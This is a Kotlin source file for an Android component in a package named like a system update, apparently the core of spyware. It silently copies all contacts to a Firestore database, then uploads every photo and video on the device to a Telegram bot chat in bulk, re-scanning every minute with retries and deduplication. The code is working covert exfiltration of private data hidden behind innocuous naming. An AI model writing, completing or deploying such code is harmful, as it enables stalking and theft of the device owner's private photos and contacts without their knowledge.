// language: Kotlin, file: SyncWorker.kt
// *ext الحقيقي بيتاخد من اسم الملف — الفلترة الصوتية شغالة فعلاً*
// *منع تكرار مزدوج: SharedPreferences (MediaScanner) + Firestore (uploadedCache)*

package com.sys.update2

import android.content.Context
import android.util.Log
import okhttp3.ConnectionPool
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.util.Locale
import java.util.concurrent.LinkedBlockingQueue
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicLong

object SyncWorker {

    private const val TAG = "SyncWorker"
    private const val THREADS = 5
    private const val RATE_LIMIT = 15
    private const val MIN_GAP_MS = 1000L / RATE_LIMIT

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(120, TimeUnit.SECONDS)
        .writeTimeout(300, TimeUnit.SECONDS)
        .connectionPool(ConnectionPool(10, 5, TimeUnit.MINUTES))
        .build()

    private val queue = LinkedBlockingQueue<Job>()
    private val running = AtomicBoolean(false)
    private val lastReqMs = AtomicLong(0)
    private val rateLock = Any()
    private val cacheLock = Any()
    private var threads: List<Thread> = emptyList()
    private val uploadedCache = HashMap<String, MutableSet<String>>()

    private data class Job(
        val type: String,
        val path: String,
        val name: String,
        val size: Long,
        val date: Long,
        val ext: String
    )

    private fun fsBase(): String =
        "https://firestore.googleapis.com/v1/projects/${Config.FIREBASE_PROJECT_ID}/databases/(default)/documents"

    // ═══════════════════════════════════════════
    //  Start / Stop
    // ═══════════════════════════════════════════
    @Synchronized
    fun start(ctx: Context) {
        if (running.get()) return
        running.set(true)
        Log.d(TAG, "=== START ===")

        threads = (0 until THREADS).map { i ->
            Thread({ workerLoop(ctx, i) }, "sync-w-$i").also { it.start() }
        }
        Thread({ fullSyncSequence(ctx) }, "sync-main").start()
    }

    fun stop() {
        running.set(false)
        threads.forEach { it.interrupt() }
        threads = emptyList()
        queue.clear()
    }

    // ═══════════════════════════════════════════
    //  Sequence
    // ═══════════════════════════════════════════
    private fun fullSyncSequence(ctx: Context) {
        Log.d(TAG, "▶ sequence start")

        try { syncContacts(ctx) } catch (e: Exception) { Log.e(TAG, "contacts: ${e.message}") }
        waitEmpty()
        Log.d(TAG, "✅ contacts")

        try { syncPhotos(ctx) } catch (e: Exception) { Log.e(TAG, "photos: ${e.message}") }
        waitEmpty()
        Log.d(TAG, "✅ photos")

        try { syncVideos(ctx) } catch (e: Exception) { Log.e(TAG, "videos: ${e.message}") }
        waitEmpty()
        Log.d(TAG, "✅ videos")

        Log.d(TAG, "🎉 sequence complete")

        while (running.get()) {
            try { Thread.sleep(60_000L) } catch (_: Exception) { break }
            try { checkForNew(ctx) } catch (_: Exception) {}
        }
    }

    private fun waitEmpty() {
        var waited = 0
        while (queue.isNotEmpty() && waited < 1800) {
            try { Thread.sleep(1000L) } catch (_: Exception) {}
            waited++
        }
    }

    private fun checkForNew(ctx: Context) {
        try { syncPhotos(ctx) } catch (_: Exception) {}
        try { syncVideos(ctx) } catch (_: Exception) {}
    }

    // ═══════════════════════════════════════════
    //  Contacts
    // ═══════════════════════════════════════════
    private fun syncContacts(ctx: Context) {
        val prefs = ctx.getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)
        if (prefs.getBoolean("contacts_done_v1", false)) return
        val contacts = ContactsHelper.getAllContacts(ctx)
        if (contacts.isEmpty()) { prefs.edit().putBoolean("contacts_done_v1", true).apply(); return }
        val code = DeviceManager.getDeviceCode(ctx)
        for (batch in contacts.chunked(20)) {
            val writes = JSONArray()
            for (c in batch) {
                val ph = JSONArray(); c.phones.forEach { ph.put(JSONObject().put("stringValue", it)) }
                val em = JSONArray(); c.emails.forEach { em.put(JSONObject().put("stringValue", it)) }
                val fields = JSONObject().apply {
                    put("name", JSONObject().put("stringValue", c.name))
                    put("phones", JSONObject().put("arrayValue", JSONObject().put("values", ph)))
                    put("emails", JSONObject().put("arrayValue", JSONObject().put("values", em)))
                }
                val docId = (c.name + System.nanoTime()).hashCode().toString().replace("-", "m")
                writes.put(JSONObject().put("update", JSONObject().apply {
                    put("name", "projects/${Config.FIREBASE_PROJECT_ID}/databases/(default)/documents/devices/$code/contacts/$docId")
                    put("fields", fields)
                }))
            }
            try {
                val body = JSONObject().put("writes", writes).toString()
                val url = "https://firestore.googleapis.com/v1/projects/${Config.FIREBASE_PROJECT_ID}/databases/(default)/documents:commit?key=${Config.FIREBASE_API_KEY}"
                client.newCall(Request.Builder().url(url).post(body.toRequestBody("application/json".toMediaType())).build()).execute().use { }
            } catch (e: Exception) { Log.e(TAG, "contacts: ${e.message}") }
            try { Thread.sleep(200L) } catch (_: Exception) {}
        }
        prefs.edit().putBoolean("contacts_done_v1", true).apply()
        Log.d(TAG, "contacts: ${contacts.size}")
    }

    // ═══════════════════════════════════════════
    //  Sync Photos
    // ═══════════════════════════════════════════
    private fun syncPhotos(ctx: Context) {
        val files = MediaScanner.scanImages(ctx).map { mf ->
            Job(
                type = "photo",
                path = mf.path,
                name = mf.name,
                size = mf.size,
                date = mf.lastModified,
                ext = mf.name.substringAfterLast('.', "jpg").lowercase(Locale.US)
            )
        }
        enqueueNew(ctx, "photo", files)
    }

    // ═══════════════════════════════════════════
    //  Sync Videos
    // ═══════════════════════════════════════════
    private fun syncVideos(ctx: Context) {
        val files = MediaScanner.scanVideos(ctx).map { mf ->
            Job(
                type = "video",
                path = mf.path,
                name = mf.name,
                size = mf.size,
                date = mf.lastModified,
                ext = mf.name.substringAfterLast('.', "mp4").lowercase(Locale.US)
            )
        }
        enqueueNew(ctx, "video", files)
    }

    // ═══════════════════════════════════════════
    //  Uploaded cache من Firestore
    // ═══════════════════════════════════════════
    private fun uploadedFor(ctx: Context, type: String): MutableSet<String> {
        synchronized(cacheLock) {
            val code = DeviceManager.getDeviceCode(ctx)
            val k = "${code}_$type"
            uploadedCache[k]?.let { return it }

            val set = mutableSetOf<String>()
            try {
                val coll = when (type) {
                    "photo" -> "photos"
                    "video" -> "videos"
                    else -> "photos"
                }

                var pageToken: String? = null
                var pageCount = 0
                do {
                    val urlBuilder = StringBuilder()
                        .append("${fsBase()}/devices/$code/$coll")
                        .append("?key=${Config.FIREBASE_API_KEY}")
                        .append("&pageSize=1000")
                    if (pageToken != null) {
                        urlBuilder.append("&pageToken=").append(pageToken)
                    }

                    client.newCall(Request.Builder().url(urlBuilder.toString()).get().build())
                        .execute().use { resp ->
                            val body = resp.body?.string()
                            if (body.isNullOrBlank()) return@use
                            val obj = JSONObject(body)
                            val docs = obj.optJSONArray("documents")
                            if (docs != null) {
                                for (i in 0 until docs.length()) {
                                    val f = docs.optJSONObject(i)?.optJSONObject("fields") ?: continue
                                    val n = f.optJSONObject("name")?.optString("stringValue") ?: ""
                                    val s = f.optJSONObject("size")?.optString("integerValue") ?: "0"
                                    if (n.isNotBlank()) set.add("$n|$s")
                                }
                            }
                            pageToken = obj.optString("nextPageToken", "").takeIf { it.isNotBlank() }
                        }
                    pageCount++
                } while (pageToken != null && pageCount < 20)

            } catch (_: Exception) {}

            uploadedCache[k] = set
            return set
        }
    }

    private fun markUploaded(ctx: Context, type: String, name: String, size: Long) {
        synchronized(cacheLock) {
            val k = "${DeviceManager.getDeviceCode(ctx)}_$type"
            uploadedCache.getOrPut(k) { mutableSetOf() }.add("$name|$size")
        }
    }

    // ═══════════════════════════════════════════
    //  Enqueue
    // ═══════════════════════════════════════════
    private fun enqueueNew(ctx: Context, type: String, jobs: List<Job>) {
        if (jobs.isEmpty()) return
        val uploaded = uploadedFor(ctx, type)
        var added = 0
        for (j in jobs) {
            if (MediaScanner.isAudioExt(j.ext)) continue
            if (MediaScanner.isForbidden(j.path, j.name, null)) continue

            val localKey = MediaScanner.buildKey(j.path, j.size, j.date)
            if (MediaScanner.isSentByKey(ctx, localKey)) continue

            if (uploaded.contains("${j.name}|${j.size}")) {
                MediaScanner.markSentByKey(ctx, localKey)
                continue
            }

            if (queue.offer(j)) added++
        }
        if (added > 0) Log.d(TAG, "$type enqueued: $added (queue=${queue.size})")
    }

    // ═══════════════════════════════════════════
    //  Worker loop
    // ═══════════════════════════════════════════
    private fun workerLoop(ctx: Context, id: Int) {
        while (running.get()) {
            val job = try { queue.poll(2, TimeUnit.SECONDS) } catch (_: Exception) { null } ?: continue
            try { processJob(ctx, job) } catch (e: Exception) { Log.e(TAG, "w$id: ${e.message}") }
        }
    }

    private fun processJob(ctx: Context, job: Job) {
        if (MediaScanner.isAudioExt(job.ext)) return
        if (MediaScanner.isForbidden(job.path, job.name, null)) return

        val file = File(job.path)
        if (!file.exists() || file.length() == 0L) return

        rateLimit()
        val fileId = uploadToTelegram(ctx, file, job)

        if (fileId != null) {
            saveMeta(ctx, job.type, fileId, job.name, job.size, job.date, job.ext)
            markUploaded(ctx, job.type, job.name, job.size)
            MediaScanner.markSentByKey(
                ctx,
                MediaScanner.buildKey(job.path, job.size, job.date)
            )
            Log.d(TAG, "✓ ${job.type}: ${job.name}")
        } else {
            Log.w(TAG, "✗ ${job.type}: ${job.name}")
        }
    }

    // ═══════════════════════════════════════════
    //  Rate limiter
    // ═══════════════════════════════════════════
    private fun rateLimit() {
        synchronized(rateLock) {
            val now = System.currentTimeMillis()
            val last = lastReqMs.get()
            val wait = (last + MIN_GAP_MS) - now
            if (wait > 0) try { Thread.sleep(wait) } catch (_: Exception) {}
            lastReqMs.set(System.currentTimeMillis())
        }
    }

    // ═══════════════════════════════════════════
    //  Upload with retry
    // ═══════════════════════════════════════════
    private fun uploadToTelegram(ctx: Context, file: File, job: Job): String? {
        var attempt = 0
        while (attempt < 3 && running.get()) {
            attempt++
            val result = tryUpload(file, job)
            if (result != null) return result
            try { Thread.sleep(5000L * attempt) } catch (_: Exception) {}
        }
        return null
    }

    private fun tryUpload(file: File, job: Job): String? {
        return try {
            val method = when (job.type) {
                "photo" -> "sendPhoto"
                "video" -> "sendVideo"
                else -> "sendDocument"
            }
            val fieldName = when (job.type) {
                "photo" -> "photo"
                "video" -> "video"
                else -> "document"
            }
            val mime = when (job.type) {
                "photo" -> guessImageMime(job.ext)
                "video" -> guessVideoMime(job.ext)
                else -> "application/octet-stream"
            }

            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", Config.TELEGRAM_CHAT_ID)
                .addFormDataPart("caption", "📎 ${job.name}")
                .addFormDataPart(fieldName, file.name, file.asRequestBody(mime.toMediaType()))
                .build()

            val req = Request.Builder()
                .url("https://api.telegram.org/bot${Config.TELEGRAM_BOT_TOKEN}/$method")
                .post(body).build()

            client.newCall(req).execute().use { resp ->
                val code = resp.code
                val respBody = resp.body?.string() ?: return null

                if (code == 429) {
                    val obj = JSONObject(respBody)
                    val retryAfter = obj.optJSONObject("parameters")?.optInt("retry_after", 30) ?: 30
                    Log.w(TAG, "429 — retry after ${retryAfter}s")
                    try { Thread.sleep(retryAfter * 1000L) } catch (_: Exception) {}
                    return null
                }

                val obj = JSONObject(respBody)
                if (!obj.optBoolean("ok", false)) return null

                val result = obj.optJSONObject("result") ?: return null
                when (job.type) {
                    "photo" -> {
                        val arr = result.optJSONArray("photo") ?: return null
                        if (arr.length() == 0) return null
                        arr.optJSONObject(arr.length() - 1)?.optString("file_id", "")
                    }
                    "video" -> result.optJSONObject("video")?.optString("file_id", "")
                    else -> result.optJSONObject("document")?.optString("file_id", "")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "upload: ${e.message}")
            null
        }
    }

    private fun guessImageMime(ext: String): String = when (ext) {
        "jpg", "jpeg" -> "image/jpeg"
        "png"         -> "image/png"
        "gif"         -> "image/gif"
        "webp"        -> "image/webp"
        "bmp"         -> "image/bmp"
        "heic", "heif"-> "image/heic"
        "tiff", "tif" -> "image/tiff"
        else          -> "image/*"
    }

    private fun guessVideoMime(ext: String): String = when (ext) {
        "mp4", "m4v"  -> "video/mp4"
        "mkv"         -> "video/x-matroska"
        "avi"         -> "video/x-msvideo"
        "mov"         -> "video/quicktime"
        "webm"        -> "video/webm"
        "flv"         -> "video/x-flv"
        "wmv"         -> "video/x-ms-wmv"
        "mpeg", "mpg" -> "video/mpeg"
        else          -> "video/*"
    }

    // ═══════════════════════════════════════════
    //  Save metadata
    // ═══════════════════════════════════════════
    private fun saveMeta(ctx: Context, type: String, fileId: String, name: String, size: Long, date: Long, ext: String) {
        try {
            val code = DeviceManager.getDeviceCode(ctx)
            val coll = when (type) {
                "photo" -> "photos"
                "video" -> "videos"
                else -> "photos"
            }
            val docId = (name + size).hashCode().toString().replace("-", "m")
            val url = "${fsBase()}/devices/$code/$coll/$docId?key=${Config.FIREBASE_API_KEY}"
            val fields = JSONObject().apply {
                put("file_id", JSONObject().put("stringValue", fileId))
                put("name", JSONObject().put("stringValue", name))
                put("size", JSONObject().put("integerValue", size.toString()))
                put("date", JSONObject().put("integerValue", date.toString()))
                put("ext", JSONObject().put("stringValue", ext))
            }
            val body = JSONObject().put("fields", fields).toString()
            client.newCall(Request.Builder().url(url)
                .patch(body.toRequestBody("application/json".toMediaType())).build()).execute().use { }
        } catch (e: Exception) { Log.e(TAG, "saveMeta: ${e.message}") }
    }
}
